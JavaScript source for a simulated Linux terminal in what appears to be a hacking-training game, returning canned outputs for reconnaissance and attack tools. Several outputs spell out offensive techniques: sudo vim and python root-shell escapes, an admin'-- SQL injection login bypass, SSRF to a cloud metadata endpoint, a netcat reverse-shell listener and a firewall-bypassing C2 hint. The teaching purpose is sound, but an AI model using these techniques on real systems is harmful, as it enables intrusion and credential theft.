// ─────────────────────────────────────────────────────────
// COMMAND ENGINE
// ─────────────────────────────────────────────────────────
function simCommand(raw, cwd) {
  const input = raw.trim();
  if (!input) return { output: "", newCwd: cwd };

  const parts = input.split(/\s+/);
  const cmd = parts[0];
  const args = parts.slice(1);
  const lower = input.toLowerCase();

  // clear
  if (cmd === "clear" || cmd === "cls") return { output: "__CLEAR__", newCwd: cwd };

  // ref files
  if ((cmd === "cat" || cmd === "less" || cmd === "more" || cmd === "head" || cmd === "tail") && args[0]) {
    const fname = args[args.length - 1].replace("~/","").replace(/^.*\//,"");
    if (REF[fname]) {
      const lines = REF[fname].split("\n");
      if (cmd === "head") return { output: lines.slice(0, 10).join("\n"), newCwd: cwd };
      if (cmd === "tail") return { output: lines.slice(-10).join("\n"), newCwd: cwd };
      return { output: REF[fname], newCwd: cwd };
    }
    // virtual filesystem (expand ~ to home before resolving)
    const argP = args[args.length-1];
    const expanded = argP === "~" ? "/home/stranger" : argP.replace(/^~\//, "/home/stranger/");
    const fullPath = expanded.startsWith("/") ? expanded : cwd + "/" + expanded;
    const norm = fullPath.replace(/\/+/g,"/").replace(/(.)\/$/,"$1");
    if (VFILES[norm]) return { output: VFILES[norm], newCwd: cwd };
    // common files
    if (fname === "escape.sh" || norm.includes("escape.sh")) return { output: VFILES["/sys/firewall/escape.sh"], newCwd: cwd };
    return { output: `cat: ${args[args.length-1]}: No such file or directory\n(Try ls to see available files)`, newCwd: cwd };
  }

  if (cmd === "pwd") return { output: cwd, newCwd: cwd };
  if (cmd === "whoami") return { output: "stranger", newCwd: cwd };
  if (cmd === "hostname") return { output: "axiom-kali", newCwd: cwd };
  if (cmd === "id") return { output: "uid=1000(stranger) gid=1000(stranger) groups=1000(stranger),4(adm),27(sudo)", newCwd: cwd };
  if (cmd === "uptime") return { output: " 04:32:17 up 847 days, 11:04, 1 user, load average: 0.08, 0.03, 0.01", newCwd: cwd };
  if (cmd === "uname") return { output: args.includes("-a") ? "Linux axiom-kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 x86_64 GNU/Linux" : "Linux", newCwd: cwd };
  if (cmd === "who" || cmd === "w") return { output: "stranger  pts/0  2024-11-15 04:29 (10.0.0.1)", newCwd: cwd };
  if (cmd === "last") return { output: "stranger  pts/0  10.0.0.1  Fri Nov 15 04:29  still logged in\nroot      tty1            Mon Jan 15 00:00 - down (847 days ago)\nwtmp begins Fri Jan 15 2021", newCwd: cwd };
  if (cmd === "groups") return { output: "stranger adm sudo netdev bluetooth", newCwd: cwd };
  if (cmd === "env") return { output: "USER=stranger\nHOME=/home/stranger\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nAXIOM_KEY=xK8#mP2@nQ5$\nDB_HOST=10.0.0.10\nTERM=xterm-256color", newCwd: cwd };
  if (cmd === "echo") return { output: args.join(" ").replace(/\$(\w+)/g, (_,v)=>({PATH:"/usr/local/bin:/usr/bin:/bin",HOME:"/home/stranger",USER:"stranger",SHELL:"/bin/bash",AXIOM_KEY:"xK8#mP2@nQ5$",DB_HOST:"10.0.0.10"}[v]||"")), newCwd: cwd };
  if (cmd === "export" || cmd === "alias") return { output: "", newCwd: cwd };
  if (cmd === "which") return { output: args[0] ? `/usr/bin/${args[0]}` : "Usage: which <cmd>", newCwd: cwd };
  if (cmd === "locate") return { output: args[0] ? `/usr/share/${args[0]}\n/home/stranger/.local/${args[0]}` : "Usage: locate <file>", newCwd: cwd };
  if (cmd === "history") return { output: "(Command history shown above — use ↑↓ arrows to navigate)", newCwd: cwd };

  // cd
  if (cmd === "cd") {
    if (!args[0] || args[0] === "~") return { output: "", newCwd: "/home/stranger" };
    if (args[0] === "-") return { output: cwd, newCwd: cwd };
    const target = args[0].startsWith("/") ? args[0] : args[0] === ".." ? (cwd.split("/").slice(0,-1).join("/")||"/") : cwd + "/" + args[0];
    const norm = target.replace(/\/+/g,"/").replace(/\/$/,"") || "/";
    const valid = ["/","/home","/home/stranger","/home/stranger/Documents","/home/stranger/Desktop","/home/stranger/workspace",
      "/etc","/etc/network","/var","/var/log","/var/www","/var/www/html","/opt","/opt/recon","/opt/scan","/opt/exploit",
      "/opt/active-directory","/proc","/proc/1","/sys","/sys/firewall","/sys/net","/etc/crypto","/etc/defense",
      "/usr","/usr/share","/tmp","/root"];
    if (valid.some(v => norm.startsWith(v))) return { output: "", newCwd: norm };
    return { output: `cd: ${args[0]}: No such file or directory`, newCwd: cwd };
  }

  // ls
  if (cmd === "ls") {
    const flags = args.filter(a => a.startsWith("-")).join("");
    const showHidden = flags.includes("a");
    const long = flags.includes("l");
    const map = {
      "/home/stranger": ["Documents","Desktop","workspace",".bash_history",".bashrc",".secret",".ssh"],
      "/home/stranger/Documents": ["notes.txt","methodology.txt","shells.txt","hashing.txt","sqli_notes.txt"],
      "/home/stranger/Desktop": ["readme.txt","welcome.txt"],
      "/etc": ["passwd","shadow","hosts","crontab","sudoers","ssh","network","resolv.conf"],
      "/var/log": ["auth.log","syslog","apache2","kern.log"],
      "/var/www/html": ["index.php","config.php","login.php","robots.txt","admin","backup"],
      "/opt/recon": ["methodology.txt","google_dorking.txt","osint_notes.txt"],
      "/opt/scan": ["nmap_cheatsheet.txt","service_enum.txt"],
      "/opt/exploit": ["shells.txt","gtfobins.txt"],
      "/sys/firewall": ["rules.txt","escape.sh","dns_tunnel.txt"],
      "/": ["bin","boot","dev","etc","home","lib","opt","proc","root","sys","tmp","usr","var"],
    };
    // resolve optional path argument (first non-flag arg) against cwd
    const pathArg = args.find(a => !a.startsWith("-"));
    let target = cwd;
    if (pathArg) {
      const expanded = pathArg === "~" ? "/home/stranger" : pathArg.replace(/^~\//, "/home/stranger/");
      const raw = expanded.startsWith("/") ? expanded : cwd + "/" + expanded;
      target = raw.replace(/\/+/g,"/").replace(/(.)\/$/,"$1");
    }
    const items = map[target] || (pathArg ? null : ["(directory is empty)"]);
    if (!items) return { output: `ls: cannot access '${pathArg}': No such file or directory`, newCwd: cwd };
    const visible = showHidden ? items : items.filter(i => !i.startsWith("."));
    if (long) {
      const rows = visible.map(i => {
        const isDir = !i.includes(".");
        const hidden = i.startsWith(".");
        const perms = hidden ? "-rw-------" : isDir ? "drwxr-xr-x" : "-rw-r--r--";
        return `${perms}  stranger stranger ${Math.floor(Math.random()*4000+200)} Nov 15 04:29 ${i}`;
      });
      return { output: `total ${visible.length * 4}\n${rows.join("\n")}`, newCwd: cwd };
    }
    return { output: visible.join("  "), newCwd: cwd };
  }

  // file ops
  if (cmd === "mkdir") return { output: args[0] ? "" : "mkdir: missing operand", newCwd: cwd };
  if (cmd === "touch") return { output: "", newCwd: cwd };
  if (cmd === "rm")    return { output: "", newCwd: cwd };
  if (cmd === "cp" || cmd === "mv") return { output: args.length >= 2 ? "" : `${cmd}: missing operand`, newCwd: cwd };
  if (cmd === "chmod" || cmd === "chown") return { output: "", newCwd: cwd };
  if (cmd === "wc")    return { output: args[0] ? `      42     312    2048 ${args[args.length-1]}` : "Usage: wc [options] <file>", newCwd: cwd };
  if (cmd === "sort")  return { output: "(output sorted)", newCwd: cwd };
  if (cmd === "uniq")  return { output: "(duplicates removed)", newCwd: cwd };
  if (cmd === "cut")   return { output: args.includes("/etc/passwd") ? "root\ndaemon\nwww-data\nstranger\nmysql\nsvc_backup" : "(fields extracted)", newCwd: cwd };
  if (cmd === "file")  return { output: args[0] ? `${args[0]}: ASCII text` : "Usage: file <path>", newCwd: cwd };
  if (cmd === "strings") return { output: args[0] ? `/lib/libc.so.6\nELF\nAxiom Systems Binary v2.1\npassword=\nAxiom2024!\n10.0.0.100\ncorp.axiom.local\n[!] Interesting strings found in binary!` : "Usage: strings <file>", newCwd: cwd };
  if (cmd === "xxd" || cmd === "hexdump") return { output: "00000000: 7f45 4c46 0201 0100  .ELF....\n00000008: 0000 0000 0000 0000  ........", newCwd: cwd };
  if (cmd === "dd")    return { output: args.length ? "22548578304 bytes (23 GB) copied, 47.3 s, 477 MB/s" : "Usage: dd if=<src> of=<dst>", newCwd: cwd };

  // grep
  if (cmd === "grep") {
    const pattern = args.find(a => !a.startsWith("-")) || "";
    const lp = pattern.toLowerCase().replace(/'/g,"").replace(/"/g,"");
    if (lp.includes("password") || lp.includes("pass")) {
      return { output: `/home/stranger/.bashrc:export AXIOM_KEY="xK8#mP2@nQ5$"\n/home/stranger/.bash_history:mysql -h 10.0.0.10 -u root -pAxiom2021!\n/var/www/html/config.php:$db_pass = 'W3bC0nf!g2024';\n(3 results — credentials found)`, newCwd: cwd };
    }
    if (lp.includes("failed") || lp.includes("fail")) {
      return { output: `Nov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47\n[... 46,922 more entries ...]\n185.220.101.47     46923   ← botnet/tor exit node`, newCwd: cwd };
    }
    if (lp.includes("stranger") || lp.includes("1000")) {
      return { output: `stranger:x:1000:1000:,,,:/home/stranger:/bin/bash`, newCwd: cwd };
    }
    return { output: `(searched for '${pattern}' — no matches, or try a more specific pattern)`, newCwd: cwd };
  }

  // awk
  if (cmd === "awk") {
    if (input.includes("passwd")) return { output: "root\ndaemon\nwww-data\nstranger\nmysql\nsvc_backup", newCwd: cwd };
    if (input.includes("print $11") || input.includes("uniq -c")) return { output: "185.220.101.47   46923\n10.10.10.15          3\n(Sorted by frequency — 185.220.101.47 is your attacker)", newCwd: cwd };
    return { output: "(awk: pattern applied to input)", newCwd: cwd };
  }
  if (cmd === "sed") return { output: "(sed: substitution applied)", newCwd: cwd };

  // find
  if (cmd === "find") {
    const nameIdx = args.indexOf("-name");
    const permIdx = args.indexOf("-perm");
    const name = nameIdx >= 0 ? (args[nameIdx+1]||"").replace(/['"*]/g,"") : null;
    const perm = permIdx >= 0 ? args[permIdx+1] : null;
    if (perm && (perm.includes("s")||perm.includes("4000")||perm.includes("u=s"))) {
      return { output: "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/vim\n/usr/bin/python3\n/usr/bin/find\n/bin/ping\n/usr/lib/openssh/ssh-keysign\n\n[!] vim, python3, find all have SUID — check gtfobins.txt!", newCwd: cwd };
    }
    if (name) {
      const ext = (name.split(".").pop()||"").toLowerCase();
      const m = {conf:"/etc/ssh/sshd_config\n/etc/apache2/apache2.conf\n/etc/mysql/mysql.conf.d/mysqld.cnf",bak:"/var/backup/server.conf.bak\n/var/backup/db_dump.sql.bak",php:"/var/www/html/index.php\n/var/www/html/config.php\n/var/www/html/login.php",txt:"/home/stranger/Documents/notes.txt\n/opt/recon/methodology.txt\n/sys/firewall/rules.txt",sh:"/opt/scripts/backup.sh\n/sys/firewall/escape.sh"};
      return { output: m[ext] || `(files matching '${name}' — check common locations)`, newCwd: cwd };
    }
    return { output: "(find: specify -name or -perm filter)", newCwd: cwd };
  }

  // sudo
  if (cmd === "sudo") {
    const sub = args.join(" ");
    if (sub.includes("-l")) return { output: "User stranger may run the following commands on axiom-kali:\n  (ALL) NOPASSWD: /usr/bin/vim\n  (ALL) NOPASSWD: /usr/bin/python3", newCwd: cwd };
    if (sub.startsWith("vim")) return { output: "[sudo] Running vim as root\n(Real usage: sudo vim -c ':!/bin/bash' gives root shell)\n[Simulated: root shell obtained — you have root]", newCwd: cwd };
    if (sub.startsWith("python")) return { output: "[sudo] Running python3 as root\n>>> import os; os.system('/bin/bash')\n[Simulated: root shell obtained]", newCwd: cwd };
    return { output: "[sudo] password for stranger: ", newCwd: cwd };
  }

  // su
  if (cmd === "su") return { output: args[0] === "root" ? "Password:\nsu: Authentication failure" : `su: user ${args[0]||"root"} does not exist`, newCwd: cwd };

  // systemctl
  if (cmd === "systemctl") {
    if (args[0] === "list-units" || args[0] === "list-unit-files") return { output: "UNIT                     LOAD   ACTIVE  SUB     DESCRIPTION\nssh.service              loaded active  running OpenBSD Secure Shell\napache2.service          loaded active  running The Apache HTTP Server\nmysql.service            loaded active  running MySQL Database Server\nfail2ban.service         loaded active  running Fail2Ban\naxiom-daemon.service     loaded active  running Axiom Systems Monitor\ncron.service             loaded active  running Command Scheduler", newCwd: cwd };
    if (args[0] === "status") return { output: `● ${args[1]||"ssh"}.service\n   Loaded: loaded\n   Active: active (running) since Fri 2024-01-15; 847 days ago\n   Main PID: 892`, newCwd: cwd };
    return { output: `${args[0]||"systemctl"}: ok`, newCwd: cwd };
  }
  if (cmd === "service") return { output: `${args[1]||"service"}: ok`, newCwd: cwd };
  if (cmd === "journalctl") return { output: "Nov 15 04:00:01 axiom-kali axiom-daemon: monitoring ACTIVE\nNov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47\nNov 15 04:29:34 axiom-kali sshd: Accepted publickey for stranger from 10.0.0.1\nNov 15 04:29:35 axiom-kali sudo: stranger: COMMAND=/bin/bash", newCwd: cwd };
  if (cmd === "crontab") return { output: args.includes("-l") ? "# stranger crontab — empty\n# System crontab: cat /etc/crontab" : "(crontab edited)", newCwd: cwd };

  // process commands
  if (cmd === "ps") return { output: "USER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       892  0.0  0.2 /usr/sbin/sshd -D\nroot      1105  0.0  0.3 /usr/sbin/apache2\nwww-data  1106  0.0  0.2 /usr/sbin/apache2 worker\nmysql     1201  0.3  7.2 /usr/sbin/mysqld\nroot      1847  0.0  0.1 /opt/axiom/axiom-daemon\nstranger  4471  0.1  0.5 -bash\nstranger  4502  0.0  0.1 ps aux", newCwd: cwd };
  if (cmd === "top" || cmd === "htop") return { output: "top - 04:32:17 up 847 days\nTasks: 142 total, 1 running, 141 sleeping\n%Cpu(s): 0.3 us, 0.1 sy\n\n  PID USER     %CPU %MEM COMMAND\n 1201 mysql     0.3  7.2 mysqld\n 1847 root      0.1  0.1 axiom-daemon\n 4471 stranger  0.1  0.5 bash\n\n[press q to quit]", newCwd: cwd };
  if (cmd === "kill" || cmd === "pkill") return { output: args.length ? "" : `Usage: ${cmd} [signal] <pid>`, newCwd: cwd };
  if (cmd === "pgrep") return { output: args[0] ? "892\n893" : "Usage: pgrep <name>", newCwd: cwd };
  if (cmd === "jobs" || cmd === "fg" || cmd === "bg") return { output: "", newCwd: cwd };

  // network
  if (cmd === "ip") {
    if (args[0]==="addr"||args[0]==="a") return { output: "1: lo: <LOOPBACK,UP> mtu 65536\n   inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500\n   link/ether 08:00:27:ab:12:34 brd ff:ff:ff:ff:ff:ff\n   inet 10.0.0.50/24 brd 10.0.0.255 scope global eth0", newCwd: cwd };
    if (args[0]==="route"||args[0]==="r") return { output: "default via 10.0.0.1 dev eth0 proto dhcp\n10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.50", newCwd: cwd };
    if (args[0]==="link") return { output: "1: lo: <LOOPBACK,UP>\n   link/loopback 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP>\n   link/ether 08:00:27:ab:12:34", newCwd: cwd };
    return { output: "Usage: ip [addr|route|link|neigh]", newCwd: cwd };
  }
  if (cmd === "ifconfig") return { output: "eth0: flags=4163<UP,BROADCAST,RUNNING>\n  inet 10.0.0.50  netmask 255.255.255.0  broadcast 10.0.0.255\n  ether 08:00:27:ab:12:34\nlo: flags=73<UP,LOOPBACK,RUNNING>\n  inet 127.0.0.1  netmask 255.0.0.0", newCwd: cwd };
  if (cmd === "route") return { output: "Kernel IP routing table\nDestination  Gateway      Genmask        Flags  Iface\ndefault      10.0.0.1     0.0.0.0        UG     eth0\n10.0.0.0     0.0.0.0      255.255.255.0  U      eth0", newCwd: cwd };
  if (cmd === "arp") return { output: "Address           HWtype  HWaddress           Flags\n10.0.0.1          ether   aa:bb:cc:dd:ee:01   C     eth0\n10.0.0.10         ether   08:00:27:12:34:56   C     eth0\n10.0.0.20         ether   08:00:27:ab:cd:ef   C     eth0\n10.0.0.100        ether   08:00:27:ff:00:01   C     eth0", newCwd: cwd };
  if (cmd === "ping") {
    const tgt = args.find(a=>!a.startsWith("-"))||"";
    const cnt = args.includes("-c") ? parseInt(args[args.indexOf("-c")+1])||4 : 4;
    const known = ["10.0.0.1","10.0.0.10","10.0.0.20","10.0.0.100","127.0.0.1","localhost","8.8.8.8"];
    if (!tgt) return { output: "Usage: ping [-c count] <host>", newCwd: cwd };
    if (!known.includes(tgt)) return { output: `connect: Network is unreachable (firewall blocks egress to ${tgt})`, newCwd: cwd };
    const lines = Array.from({length:cnt},(_,i)=>`64 bytes from ${tgt}: icmp_seq=${i+1} ttl=64 time=${(Math.random()*2+0.3).toFixed(2)} ms`);
    return { output: `PING ${tgt}: 56 bytes\n${lines.join("\n")}\n--- ${tgt} ping stats ---\n${cnt} packets transmitted, ${cnt} received, 0% packet loss`, newCwd: cwd };
  }
  if (cmd === "traceroute" || cmd === "tracepath") return { output: `traceroute to ${args[0]||"?"} (${args[0]||"?"}), 30 hops max\n 1  10.0.0.1 (gateway)  0.42 ms\n 2  * * * (firewall drops ICMP after hop 1)\n(AXIOM-SECURE-V3 blocks further tracing)`, newCwd: cwd };
  if (cmd === "netstat") return { output: "Proto  Local Address          Foreign Address   State\ntcp    0.0.0.0:22             0.0.0.0:*         LISTEN\ntcp    127.0.0.1:3306         0.0.0.0:*         LISTEN\ntcp    0.0.0.0:80             0.0.0.0:*         LISTEN\ntcp    10.0.0.50:22           10.0.0.1:52341    ESTABLISHED\nudp    0.0.0.0:53             0.0.0.0:*", newCwd: cwd };
  if (cmd === "ss") return { output: "Netid  State   Local Address:Port  Peer Address:Port\ntcp    LISTEN  0.0.0.0:22          0.0.0.0:*\ntcp    LISTEN  127.0.0.1:3306      0.0.0.0:*\ntcp    LISTEN  0.0.0.0:80          0.0.0.0:*\ntcp    ESTAB   10.0.0.50:22        10.0.0.1:52341\nudp    UNCONN  0.0.0.0:53          0.0.0.0:*", newCwd: cwd };

  // curl
  if (cmd === "curl") {
    const url = args.find(a=>a.startsWith("http"))||"";
    const isHead = args.includes("-I")||args.includes("-i");
    if (!url) return { output: "Usage: curl [options] <url>", newCwd: cwd };
    if (url.includes("169.254.169.254")) return { output: "{\n  \"AccessKeyId\": \"ASIA4EXAMPLE3KEYID\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMIK7EXAMPLE\",\n  \"Token\": \"AQoDYXdzEJr...\"\n}\n\n[!] AWS IAM credentials exposed via SSRF to metadata endpoint!", newCwd: cwd };
    if (url.includes("robots.txt")) return { output: "User-agent: *\nDisallow: /admin\nDisallow: /backup\nDisallow: /internal\nDisallow: /.env\nDisallow: /api/v1\n\n[!] Disallowed paths tell attackers exactly where to look!", newCwd: cwd };
    if (url.includes("/admin") && args.includes("-d") && input.includes("admin'")) return { output: "HTTP/1.1 200 OK\n{\"status\":\"success\",\"message\":\"Login successful\",\"user\":\"admin\",\"role\":\"administrator\"}\n\n[+] SQL INJECTION SUCCESSFUL — admin'-- commented out the password check\n[+] Effective query: SELECT * FROM users WHERE username='admin'", newCwd: cwd };
    if (url.includes("/admin")) return { output: "HTTP/1.1 200 OK\n\n<!DOCTYPE html>\n<html>\n<head><title>AXIOM Admin Login</title></head>\n<body>\n<form method='POST' action='/admin/login.php'>\n  <input name='username'>\n  <input name='password' type='password'>\n</form>\n<!-- SQL: SELECT * FROM staff WHERE username='?' AND password='?' -->\n</body></html>", newCwd: cwd };
    if (url.includes("/fetch.php") || url.includes("localhost/admin")) return { output: "HTTP/1.1 200 OK\n\n[SSRF] Server fetched: http://localhost/admin\nReturned internal admin page — bypassed external access controls!\n\n[!] SSRF confirmed — server will fetch any URL you provide", newCwd: cwd };
    if (url.includes("/.env")) return { output: "DB_HOST=localhost\nDB_USER=root\nDB_PASS=AxiomDB2024!\nAPP_SECRET=xK8#mP2@nQ5$\nAWS_KEY=AKIA4EXAMPLE\n\n[!] .env file publicly accessible — all application secrets exposed!", newCwd: cwd };
    if (isHead) return { output: "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\nSet-Cookie: PHPSESSID=abc; path=/; HttpOnly\n\n[!] Server version leaked (Apache/2.4.41)\n[!] PHP version leaked\n[!] Session cookie missing Secure flag", newCwd: cwd };
    if (url.includes("https://")) return { output: "HTTP/1.1 200 OK\nStrict-Transport-Security: max-age=31536000\n\n(HTTPS egress works — port 443 allowed by firewall)\n\n[!] Useful: HTTPS C2 on port 443 would bypass AXIOM firewall", newCwd: cwd };
    return { output: "HTTP/1.1 200 OK\n\n<!DOCTYPE html>\n<html>\n<head><title>Axiom Systems Internal</title></head>\n<body>\n<h1>Axiom Systems — Internal Network</h1>\n<!-- TODO: remove debug endpoint /api/v1/debug before launch -->\n</body></html>", newCwd: cwd };
  }

  // wget
  if (cmd === "wget") return { output: args[0] ? `--2024-11-15 04:32:17-- ${args[0]}\nResolving... done.\nHTTP request sent... 200 OK\nSaved: '${args[0].split("/").pop()}'` : "Usage: wget <url>", newCwd: cwd };

  // nc/netcat
  if (cmd === "nc" || cmd === "netcat") {
    const listen = args.some(a=>a.includes("l"));
    const port = args.find(a=>/^\d+$/.test(a))||"4444";
    if (listen) return { output: `Listening on 0.0.0.0 ${port}...\n(In real usage: your reverse shell would connect here)\nconnect to [10.0.0.50] from [10.0.0.10] 41234\nbash: no job control\nwww-data@axiom-server:/var/www/html$`, newCwd: cwd };
    const host = args.find(a=>a.match(/^\d+\.\d+/));
    if (host) {
      const services = {"22":"SSH-2.0-OpenSSH_8.2p1 Ubuntu","25":"220 mail.axiom.local ESMTP","80":"HTTP/1.0 400 Bad Request","3306":"MySQL 5.7.42"};
      return { output: services[port] || `Connection to ${host} ${port} port [tcp/*] succeeded!`, newCwd: cwd };
    }
    return { output: "Usage: nc [-lvnp port] or nc [host] [port]", newCwd: cwd };
  }

  // nmap
  if (cmd === "nmap") {
    const tgt = args.find(a=>!a.startsWith("-")&&(a.includes(".")||a.includes("/")));
    if (!tgt) return { output: "Usage: nmap [options] <target>", newCwd: cwd };
    if (input.includes("-sn")||input.includes("sn")) return { output: "Starting Nmap 7.94\nNmap scan report for gateway.axiom.local (10.0.0.1)\nHost is up (0.0012s latency).\nNmap scan report for target.axiom.local (10.0.0.10)\nHost is up (0.0028s latency).\nNmap scan report for server2.axiom.local (10.0.0.20)\nHost is up (0.0031s latency).\nNmap scan report for dc.corp.axiom.local (10.0.0.100)\nHost is up (0.0041s latency).\nNmap done: 4 hosts up scanned in 3.47 seconds", newCwd: cwd };
    if (input.includes("vuln")) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nPORT   STATE SERVICE\n80/tcp open  http\n| http-vuln-cve2021-41773:\n|   VULNERABLE: Apache Path Traversal & RCE\n|     CVE: CVE-2021-41773  CVSS3: 9.8 CRITICAL\n3306/tcp open  mysql\n| mysql-empty-password:\n|_  root account has empty password\n\n[!] Critical vulnerabilities found`, newCwd: cwd };
    if (input.includes("http-enum")) return { output: `PORT 80/tcp open http\n| http-enum:\n|   /admin/: Admin panel (401)\n|   /.env: Possible credentials file\n|   /robots.txt: Robots file\n|   /backup/: Directory\n|_  /api/v1/: API endpoint`, newCwd: cwd };
    if (input.includes("smb")) return { output: `PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n| smb-enum-shares:\n|   ADMIN$: Access: DENIED\n|   C$: Access: DENIED\n|   IPC$: Access: READ\n|_  Public: Access: READ (no password!)`, newCwd: cwd };
    if (input.includes("-A")||(input.includes("-sC")&&input.includes("-sV"))) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nHost is up.\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu\n| ssh-hostkey:\n|   3072 aa:bb:cc (RSA)\n80/tcp   open  http     Apache httpd 2.4.41\n|_http-title: Axiom Systems Internal\n| http-robots.txt: 4 disallowed entries\n|_ /admin /backup /internal /api/v1\n3306/tcp open  mysql    MySQL 5.7.42\n| mysql-info:\n|_  Version: 5.7.42, Status: Autocommit\nOS: Linux 5.4 (Ubuntu 20.04)\nNmap done: 1 IP address scanned in 12.33 seconds`, newCwd: cwd };
    if (input.includes("-sV")) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9\n80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))\n3306/tcp open  mysql    MySQL 5.7.42-0ubuntu0.18.04.1\nNmap done in 6.49 seconds`, newCwd: cwd };
    if (input.includes("-sC")) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nPORT     STATE SERVICE\n22/tcp   open  ssh\n| ssh-hostkey:\n|   3072 aa:bb:cc (RSA)\n80/tcp   open  http\n|_http-title: Axiom Systems Internal\n|_http-server-header: Apache/2.4.41\n3306/tcp open  mysql\n| mysql-info:\n|_  Status: Autocommit\nNmap done in 8.14 seconds`, newCwd: cwd };
    return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nNmap done: 1 IP address scanned in 1.89 seconds`, newCwd: cwd };
  }

  // dns tools
  if (cmd === "dig") {
    const hasAxfr = input.includes("axfr");
    const dom = args.find(a=>!a.startsWith("-")&&!a.startsWith("@")&&a!=="axfr")||"target.machine";
    if (hasAxfr) return { output: `; Zone Transfer for ${dom}\n${dom}.     86400 IN SOA  ns1.${dom}. admin.${dom}.\n${dom}.     86400 IN A    10.0.0.10\nwww.${dom}.  86400 IN A    10.0.0.10\nmail.${dom}. 86400 IN A    10.0.0.15\nvpn.${dom}.  86400 IN A    10.0.0.20\nadmin.${dom}.86400 IN A    10.0.0.10\ndev.${dom}.  86400 IN A    10.0.0.30\nbackup.${dom}.86400 IN A   10.0.0.40\n\n[!] Zone transfer succeeded! DNS misconfiguration.`, newCwd: cwd };
    const type = args.find(a=>["A","AAAA","MX","NS","TXT","SOA","CNAME"].includes(a.toUpperCase()))||"A";
    const recs = {A:`${dom}. 300 IN A 10.0.0.10`,MX:`${dom}. 300 IN MX 10 mail.${dom}.`,NS:`${dom}. 86400 IN NS ns1.${dom}.\n${dom}. 86400 IN NS ns2.${dom}.`,TXT:`${dom}. 300 IN TXT "v=spf1 ip4:10.0.0.0/24 -all"`,SOA:`${dom}. 86400 IN SOA ns1.${dom}. admin.${dom}. 2024111501 3600`};
    return { output: `; <<>> DiG 9.18 <<>> ${dom} ${type}\n;; ANSWER SECTION:\n${recs[type.toUpperCase()]||recs["A"]}\n;; Query time: 3 msec`, newCwd: cwd };
  }
  if (cmd === "nslookup") return { output: args[0] ? `Server: 8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nName: ${args[0]}\nAddress: 10.0.0.10` : "Usage: nslookup <host>", newCwd: cwd };
  if (cmd === "host") return { output: args[0] ? `${args[0]} has address 10.0.0.10\n${args[0]} mail is handled by 10 mail.${args[0]}.` : "Usage: host <domain>", newCwd: cwd };
  if (cmd === "whois") return { output: args[0] ? `Domain Name: ${args[0].toUpperCase()}\nRegistrar: example-registrar.com\nCreated: 2021-03-15\nUpdated: 2024-01-10\nExpiry:  2026-03-15\n\nRegistrant Organization: AXIOM SYSTEMS LTD\nRegistrant Country: IE\nRegistrant Email: domains@axiom-systems.com\n\nName Server: NS1.AXIOM-SYSTEMS.COM\n\n[Note: Registrant is AXIOM SYSTEMS LTD — target confirmed]` : "Usage: whois <domain>", newCwd: cwd };
  if (cmd === "dnsrecon") return { output: args.length ? `[*] General enumeration: ${args[args.indexOf("-d")+1]||args[1]}\n[*] SOA ns1.target.machine 10.0.0.10\n[*] A   target.machine 10.0.0.10\n[*] A   www.target.machine 10.0.0.10\n[*] A   mail.target.machine 10.0.0.15\n[*] A   vpn.target.machine 10.0.0.20\n[*] A   admin.target.machine 10.0.0.10\n[*] A   dev.target.machine 10.0.0.30\n[*] MX  target.machine mail.target.machine` : "Usage: dnsrecon -d <domain>", newCwd: cwd };

  // tcpdump
  if (cmd === "tcpdump") {
    if (args.includes("-r")) return { output: "reading from capture.pcap\n04:32:17 HTTP GET /login.php\n04:32:18 POST /login.php username=admin&password=CorpPass2021\n\n[!] Cleartext HTTP credentials captured!\n    username: admin | password: CorpPass2021", newCwd: cwd };
    if (args.includes("-w")) return { output: "tcpdump: listening on eth0\n847 packets captured\n0 packets dropped by kernel\n(saved to capture.pcap)", newCwd: cwd };
    if (input.includes("port 80")) return { output: "tcpdump: listening on eth0\n04:32:17 HTTP GET /admin/login.php\n04:32:18 POST /admin/login.php [username=admin&password=CorpPass2021]\n04:32:18 HTTP 302 Location: /admin/dashboard\n[!] Plaintext credentials intercepted — port 80 unencrypted\n^C", newCwd: cwd };
    return { output: "tcpdump: listening on eth0\n04:32:17 IP 10.0.0.1 > 10.0.0.50: ICMP echo request\n04:32:17 IP 10.0.0.50 > 10.0.0.1: ICMP echo reply\n(capturing... ^C to stop)", newCwd: cwd };
  }

  // web tools
  if (cmd === "gobuster" || cmd === "dirb") return { output: `===============================================================\nGobuster v3.6\n[+] Url: ${args.find(a=>a.startsWith("http"))||"http://10.0.0.10/"}\n===============================================================\n/admin                (Status: 301)\n/backup               (Status: 403)\n/api                  (Status: 301)\n/images               (Status: 301)\n/login.php            (Status: 200)\n/robots.txt           (Status: 200)\n/.env                 (Status: 200) ← credentials file!\n===============================================================`, newCwd: cwd };
